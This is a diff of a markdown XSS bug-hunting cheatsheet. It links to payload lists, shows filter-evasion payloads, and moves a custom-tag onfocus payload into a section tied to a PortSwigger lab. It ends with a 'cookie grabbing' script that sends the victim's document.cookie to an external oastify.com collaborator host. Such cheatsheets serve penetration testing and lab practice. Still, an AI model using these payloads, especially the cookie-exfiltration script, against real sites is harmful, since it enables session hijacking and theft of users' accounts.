@@ -2,11 +2,6 @@
 https://github.com/payloadbox/xss-payload-list
 ##### For filter bypass
 https://github.com/terjanq/Tiny-XSS-Payloads
-###### Key Note
-```tabindex="1"```, ```id="a1"```, ```#a1```
-```
-<custom-tag tabindex="1" onfocus='alert(1337)' id="a1">#a1
-```
 ## XSS with filter evasion
 ```
 <IMG SRC="jav&#x09;ascript:alert('XSS');">
@@ -76,7 +71,13 @@ xss';alert(1);'xss
 Finally the code will look like this after response.
 ![Screenshot from 2024-06-23 19-29-18](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/5387641e-5ee7-4dca-89a3-e1253a426bc5)
 # Reflected XSS into HTML context with most tags and attributes blocked
-https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked
+https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked. Bruteforce for getting allowed tags.
+## Reflected XSS into HTML context with all tags blocked except custom ones
+###### Key Note
+```tabindex="1"```, ```id="a1"```, ```#a1```
+```
+<custom-tag tabindex="1" onfocus='alert(1337)' id="a1">#a1
+```
 #### For cookie grabbing
 ```js
 <script>document.location='https://r91uwnam29s3c1jdsyc8t7t34ualyfm4.oastify.com//'+document.cookie</script> 
